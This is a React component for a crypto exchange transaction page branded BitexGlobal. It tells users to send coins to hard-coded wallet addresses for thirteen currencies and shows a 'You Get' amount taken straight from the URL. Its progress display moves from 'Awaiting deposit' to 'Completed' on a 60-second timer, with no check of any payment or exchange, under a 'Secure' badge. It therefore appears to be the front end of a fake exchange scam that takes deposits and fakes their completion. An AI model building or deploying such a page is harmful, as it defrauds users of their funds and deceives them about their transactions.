import React, { useState, useEffect } from "react";
import QRCode from "qrcode";
import { useSearchParams } from "react-router-dom";
import TipsCard from "./TipsCard";

import bitconIcon from "../assets/bitcoin.png";
import ethIcon from "../assets/ethereum.png";
import bnbIcon from "../assets/bnb.png";
import usdtIcon from "../assets/Tether.png";
import xrpIcon from "../assets/xrp.png";
import dogeIcon from "../assets/dogecoin.png";
import solIcon from "../assets/solana.png";
import maticIcon from "../assets/polygon.png";
import trxIcon from "../assets/tron-logo.png";
import adaIcon from "../assets/cardano.png";
import sidraIcon from "../assets/Sidra.webp";
import shibIcon from "../assets/shiba.png";
import piIcon from "../assets/pi_network.jpg";

const TransactionPage = () => {
  const [searchParams] = useSearchParams();
  const [send, setSend] = useState(() => {
    return searchParams.get("send") || "0.01";
  });
  const fromCurrency = searchParams.get("from") || "BTC";
  const toCurrency = searchParams.get("to") || "ETH";
  const getAmount = searchParams.get("get") || "0.2740839";
  const wallet = searchParams.get("wallet") || "";
  const email = searchParams.get("email") || "";
  const refundWallet = searchParams.get("refund") || "";

  const [isDesktop, setIsDesktop] = useState(window.innerWidth >= 1024);

  useEffect(() => {
    const handleResize = () => {
      setIsDesktop(window.innerWidth >= 1024);
    };
    window.addEventListener("resize", handleResize);
    return () => {
      window.removeEventListener("resize", handleResize);
    };
  }, []);

  const myAddress = new Map([
  ["BTC", "bc1q0wa4efcyfcpwsl8jfqww5emhdzgv4d64lgceem"],
  ["ETH", "0xa7550Db929E8501f8c85e02cB70692652c1675Ab"],
  ["USDT", "0xa7550Db929E8501f8c85e02cB70692652c1675Ab"],
  ["LTC", "ltc1q0jp0m2cs2lt3wz6z8z5k2fe0267gx9qpj8wunt"],
  ["BNB", "0xa7550Db929E8501f8c85e02cB70692652c1675Ab"],
  ["XRP", "rf2Pc9UnS5FPuoLxTVjhN31zG3qGbtPq5w"],
  ["DOGE", "DKtkymsNFxDPryJvTUStC9SzczNbcA58cq"],
  ["SOL", "BbrihjgxeNhTHDH5Xzp5Dp7oKfcFwsQBbbb184Y9CsF2"],
  ["TRX", "TXC1MnuVbnr2yFETFxdEm1VmUUYhCA5xiQ"],
  [
    "ADA",
    "addr1q9g36n3095gpdwvpanxjd28ggf6jue043u37u559dngqzpnsascmashhgzu3fafwct5xpup6rchs2dg889h7f7s23cxsnfp6ht",
  ],
  ["MATIC", "0xa7550Db929E8501f8c85e02cB70692652c1675Ab"],
  ["SHIB", "0xa7550Db929E8501f8c85e02cB70692652c1675Ab"],
  ["PI", "GAZBNWNM27EDQE67WWY2EJH4YLBOQR4V6657AGK7NUZG6T5VGNA4GZG5"],
  ["SIDRA", "0x85E5C0587fBae24A65Bc45e011Da2b5FB86f2dE0"],
]);


  const rotateAnimation = `
  @keyframes rotate {
    from { transform: rotate(0deg); }
    to { transform: rotate(360deg); }
  }
`;

  const css = `
  ${rotateAnimation}
`;
  const styleTag = document.createElement("style");
  styleTag.textContent = css;
  if (!document.head.querySelector("style[data-transaction-styles]")) {
    styleTag.setAttribute("data-transaction-styles", "true");
    document.head.appendChild(styleTag);
  }

  const currencyEmojis = {
    BTC: <img src={bitconIcon} alt="BTC" style={{ width: 20, height: 20 }} />,
    ETH: <img src={ethIcon} alt="ETH" style={{ width: 20, height: 20 }} />,
    BNB: <img src={bnbIcon} alt="BNB" style={{ width: 20, height: 20 }} />,
    USDT: <img src={usdtIcon} alt="USDT" style={{ width: 20, height: 20 }} />,
    XRP: <img src={xrpIcon} alt="XRP" style={{ width: 20, height: 20 }} />,
    DOGE: <img src={dogeIcon} alt="DOGE" style={{ width: 20, height: 20 }} />,
    SOL: <img src={solIcon} alt="SOL" style={{ width: 20, height: 20 }} />,
    MATIC: (
      <img src={maticIcon} alt="MATIC" style={{ width: 20, height: 20 }} />
    ),
    TRX: <img src={trxIcon} alt="TRX" style={{ width: 20, height: 20 }} />,
    ADA: <img src={adaIcon} alt="ADA" style={{ width: 20, height: 20 }} />,
    SIDRA: (
      <img src={sidraIcon} alt="SIDRA" style={{ width: 20, height: 20 }} />
    ),
    SHIB: <img src={shibIcon} alt="SHIB" style={{ width: 20, height: 20 }} />,
    PI: <img src={piIcon} alt="PI" style={{ width: 20, height: 20 }} />,
    USD: <span style={{ fontSize: 18 }}>🇺🇸</span>,
    BitEx: (
      <span
        style={{
          width: 20,
          height: 20,
          background: "#10b981",
          color: "#fff",
          borderRadius: "50%",
          display: "inline-flex",
          alignItems: "center",
          justifyContent: "center",
          fontSize: 12,
          fontWeight: "bold",
        }}
      >
        B
      </span>
    ),
  };

  const [qrTab, setQrTab] = useState("amount");
  const [qrCodeDataUrl, setQrCodeDataUrl] = useState("");
  const [transactionId] = useState(() =>
    Math.random().toString(16).substring(2, 15)
  );
  const [startTime] = useState(() => Date.now());
  const [currentStatus, setCurrentStatus] = useState(0);
  const [timeElapsed, setTimeElapsed] = useState(0);

const statuses = [
  { name: "Awaiting deposit", color: "#10b981", icon: "◐", rotating: true },
  { name: "Confirming", color: "#10b981", icon: "⟳", rotating: true },
  { name: "Exchanging", color: "#10b981", icon: "⇄", rotating: true },
  { name: "Completed", color: "#10b981", icon: "✓", rotating: false },
];

  const depositAddress = myAddress.get(fromCurrency) || "";

 
  useEffect(() => {
  const timer = setInterval(() => {
    const elapsed = Math.floor((Date.now() - startTime) / 1000);
    setTimeElapsed(elapsed);

    // Each status lasts 60 seconds, stop at status 3 (Completed)
    const statusIndex = Math.min(Math.floor(elapsed / 60), 3);
   setCurrentStatus(statusIndex);

    // Clear interval when completed
    if (statusIndex === 3) {
      clearInterval(timer);
    }
  }, 1000);

  return () => clearInterval(timer);
}, [startTime]);

  useEffect(() => {
    const generateQR = async () => {
      try {
        let qrContent = "";

        if (qrTab === "amount") {
          switch (fromCurrency.toLowerCase()) {
            case "btc":
              qrContent = `bitcoin:${depositAddress}?amount=${send}`;
              break;
            case "eth":
              qrContent = `ethereum:${depositAddress}@1?value=${
                parseFloat(send) * 1e18
              }`;
              break;
            case "usdt":
              qrContent = `ethereum:${depositAddress}@1?value=0&uint256=${
                parseFloat(send) * 1e6
              }`;
              break;
            case "bnb":
              qrContent = `binancecoin:${depositAddress}?amount=${send}`;
              break;
            case "ltc":
              qrContent = `litecoin:${depositAddress}?amount=${send}`;
              break;
            case "doge":
              qrContent = `dogecoin:${depositAddress}?amount=${send}`;
              break;
            case "xrp":
              qrContent = `ripple:${depositAddress}?amount=${send}`;
              break;
            case "sol":
              qrContent = `solana:${depositAddress}?amount=${send}`;
              break;
            case "trx":
              qrContent = `tron:${depositAddress}?amount=${send}`;
              break;
            default:
              qrContent = depositAddress;
          }
        } else {
          qrContent = depositAddress;
        }

        const dataUrl = await QRCode.toDataURL(qrContent, {
          width: 200,
          margin: 2,
          color: {
            dark: "#000000",
            light: "#ffffff",
          },
          errorCorrectionLevel: "M",
        });

        setQrCodeDataUrl(dataUrl);
      } catch (error) {
        console.error("Error generating QR code:", error);
        try {
          const fallbackDataUrl = await QRCode.toDataURL(depositAddress, {
            width: 200,
            margin: 2,
            color: {
              dark: "#000000",
              light: "#ffffff",
            },
          });
          setQrCodeDataUrl(fallbackDataUrl);
        } catch (fallbackError) {
          console.error("Fallback QR generation failed:", fallbackError);
        }
      }
    };

    generateQR();
  }, [qrTab, depositAddress, send, fromCurrency]);

  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text).then(() => {
      // Could add a toast notification here
    });
  };

  const formatTime = (seconds) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, "0")}`;
  };

  return (
    <div
      style={{
        display: "flex",
        flexDirection: isDesktop ? "row" : "column",
        gap: 24,
        alignItems: isDesktop ? "flex-start" : "center",
        justifyContent: "center",
        padding: isDesktop ? 24 : 16,
        maxWidth: 1200,
        margin: "0 auto",
      }}
    >
      <div
        style={{ flex: 1, maxWidth: isDesktop ? 760 : "100%", width: "100%" }}
      >
        {/* Transaction ID Header */}
        <div
          style={{
            display: "flex",
            justifyContent: "flex-end",
            alignItems: "center",
            gap: 8,
            marginBottom: 16,
            color: "#6b7280",
            fontSize: 14,
          }}
        >
          <span>Transaction ID</span>
          <span style={{ fontFamily: "monospace" }}>{transactionId}</span>
          <button
            onClick={() => copyToClipboard(transactionId)}
            style={{
              background: "transparent",
              border: "none",
              cursor: "pointer",
              padding: 4,
            }}
          >
            📋
          </button>
        </div>

        {/* Main content */}
        <div
          style={{
            background: "#fff",
            borderRadius: 12,
            boxShadow: "0 2px 10px rgba(0,0,0,0.06)",
            padding: isDesktop ? 20 : 16,
          }}
        >
          <div
            style={{
              display: "flex",
              justifyContent: "space-between",
              alignItems: "center",
            }}
          >
            <div style={{ color: "#6b7280", fontWeight: 600 }}>
              Please send the funds you would like to exchange
            </div>
            <button
              onClick={() => window.history.back()}
              style={{
                background: "#10b981",
                color: "#fff",
                border: "none",
                borderRadius: 8,
                padding: "10px 14px",
                fontWeight: 700,
                cursor: "pointer",
              }}
            >
              Cancel
            </button>
          </div>

          <div
            style={{
              marginTop: 16,
              display: "grid",
              gridTemplateColumns: isDesktop ? "1fr 280px" : "1fr",
              gap: 24,
              alignItems: "start",
            }}
          >
            <div>
              <div style={{ color: "#6b7280", fontSize: 12, marginBottom: 6 }}>
                Amount
              </div>
              <div style={{ fontSize: 24, fontWeight: 700, color: "#000" }}>
                {send} {fromCurrency}
              </div>

              <div style={{ color: "#6b7280", fontSize: 12, marginTop: 12 }}>
                To this address
              </div>
              <div
                style={{
                  fontFamily: "monospace",
                  fontSize: 14,
                  display: "flex",
                  alignItems: "center",
                  gap: 8,
                  wordBreak: "break-all",
                }}
              >
                <span style={{ color: "#000" }}>{depositAddress}</span>
                <button
                  onClick={() => copyToClipboard(depositAddress)}
                  style={{
                    background: "transparent",
                    border: "none",
                    cursor: "pointer",
                    padding: 2,
                  }}
                >
                  📋
                </button>
              </div>

              <div style={{ color: "#6b7280", fontSize: 12, marginTop: 12 }}>
                Transaction Date
              </div>
              <div style={{ fontSize: 14, color: "#000" }}>
                {new Date().toLocaleString()}
              </div>

              {/* <div style={{ color: "#6b7280", fontSize: 12, marginTop: 12 }}>
                Status
              </div>
              <div
                style={{
                  display: "inline-block",
                  background: "#e5f7ff",
                  color: "#0891b2",
                  borderRadius: 6,
                  padding: "4px 8px",
                  fontSize: 12,
                  fontWeight: 700,
                }}
              >
                {statuses[currentStatus].name.toUpperCase()}
              </div>

              <div style={{ marginTop: 8, fontSize: 12, color: "#6b7280" }}>
                Time elapsed: {formatTime(timeElapsed)}
              </div> */}
            </div>

            {/* QR Code Section */}
            <div>
              {/* QR Tabs */}
              <div style={{ display: "flex", marginBottom: 8 }}>
                <button
                  onClick={() => setQrTab("address")}
                  style={{
                    background: qrTab === "address" ? "#6b7280" : "transparent",
                    color: qrTab === "address" ? "#fff" : "#000",
                    border: "1px solid #e5e7eb",
                    borderRadius: "8px 0 0 8px",
                    padding: "8px 16px",
                    fontSize: 12,
                    cursor: "pointer",
                  }}
                >
                  Address
                </button>
                <button
                  onClick={() => setQrTab("amount")}
                  style={{
                    background: qrTab === "amount" ? "#6b7280" : "transparent",
                    color: qrTab === "amount" ? "#fff" : "#000",
                    border: "1px solid #e5e7eb",
                    borderRadius: "0 8px 8px 0",
                    padding: "8px 16px",
                    fontSize: 12,
                    cursor: "pointer",
                  }}
                >
                  With amount
                </button>
              </div>

              {/* QR Display */}
              <div
                style={{
                  width: "100%",
                  maxWidth: 280,
                  height: isDesktop ? 280 : "auto",
                  background: "#f3f4f6",
                  borderRadius: 12,
                  position: "relative",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  padding: isDesktop ? 0 : "20px 0",
                  margin: isDesktop ? 0 : "0 auto",
                }}
              >
                {qrCodeDataUrl && (
                  <img
                    src={qrCodeDataUrl}
                    alt="QR Code"
                    style={{ width: 200, height: 200 }}
                  />
                )}
                <div
                  style={{
                    position: "absolute",
                    width: 56,
                    height: 56,
                    background: "#f59e0b",
                    color: "#fff",
                    borderRadius: 9999,
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "center",
                    fontSize: 28,
                  }}
                >
                  {currencyEmojis[fromCurrency] || "💰"}
                </div>
              </div>
            </div>
          </div>

          <div style={{ marginTop: 16, borderTop: "1px solid #e5e7eb" }} />

          {/* Progress Steps */}
        
          <div
            style={{
              marginTop: 20,
              display: "flex",
              flexDirection: isDesktop ? "row" : "column",
              alignItems: isDesktop ? "center" : "flex-start",
              gap: isDesktop ? 32 : 16,
              color: "#6b7280",
            }}
          >
            {statuses.map((status, index) => (
              <div
                key={index}
                style={{
                  color: index <= currentStatus ? status.color : "#6b7280",
                  display: "flex",
                  alignItems: "center",
                  gap: 4,
                }}
              >
                <span
                  style={{
                    width: "20px",
                    height: "20px",
                    display: "inline-flex",
                    alignItems: "center",
                    justifyContent: "center",
                    borderRadius: "50%",
                    border: `2px solid ${
                      index <= currentStatus ? status.color : "#6b7280"
                    }`,
                    fontSize: "12px",
                    fontWeight: "bold",
                    ...(index === currentStatus &&
                      status.rotating && {
                        animation: "rotate 2s linear infinite",
                        borderRightColor: "transparent",
                      }),
                    ...(index < currentStatus && {
                      // Completed previous steps get solid background with checkmark
                      border: "none",
                      background: status.color,
                      color: "#fff",
                    }),
                    ...(index === currentStatus &&
                      !status.rotating && {
                        // Current completed step also gets checkmark
                        border: "none",
                        background: status.color,
                        color: "#fff",
                      }),
                  }}
                >
                  {index < currentStatus ||
                  (index === currentStatus && !status.rotating)
                    ? "✓"
                    : ""}
                </span>
                <span>{status.name}</span>
              </div>
            ))}
          </div>
          {/* Summary */}
          <div style={{ marginTop: 20 }}>
            <div style={{ color: "#6b7280", fontSize: 12 }}>You Get</div>
            <div style={{ fontWeight: 700, fontSize: 18, color: "#000" }}>
              {getAmount} {toCurrency}
            </div>
            {wallet && (
              <>
                <div style={{ color: "#6b7280", fontSize: 12, marginTop: 8 }}>
                  Recipient Wallet
                </div>
                <div
                  style={{
                    fontFamily: "monospace",
                    fontSize: 14,
                    display: "flex",
                    alignItems: "center",
                    gap: 8,
                    wordBreak: "break-all",
                  }}
                >
                  <span style={{ color: "#000" }}>{wallet}</span>
                  <button
                    onClick={() => copyToClipboard(wallet)}
                    style={{
                      background: "transparent",
                      border: "none",
                      cursor: "pointer",
                      padding: 2,
                    }}
                  >
                    📋
                  </button>
                </div>
              </>
            )}
          </div>
        </div>

        <TipsCard />
      </div>

      {/* Sidebar */}
      <div
        style={{
          width: isDesktop ? 300 : "100%",
          position: isDesktop ? "sticky" : "static",
          top: isDesktop ? 20 : 0,
        }}
      >
        <div style={{ background: "#f3f4f6", borderRadius: 12, padding: 16 }}>
          <div style={{ color: "#6b7280", fontSize: 13, marginBottom: 8 }}>
            Please make sure you're on https://BitexGlobal.net
          </div>
          <div
            style={{
              display: "flex",
              alignItems: "center",
              gap: 8,
              background: "#fff",
              borderRadius: 8,
              padding: 8,
            }}
          >
            <span style={{ color: "#10b981" }}>🔒 Secure</span>
            <span style={{ color: "#6b7280", fontSize: 13 }}>
              | https://BitexGlobal.net
            </span>
          </div>
        </div>
      </div>
    </div>
  );
};

export default TransactionPage;








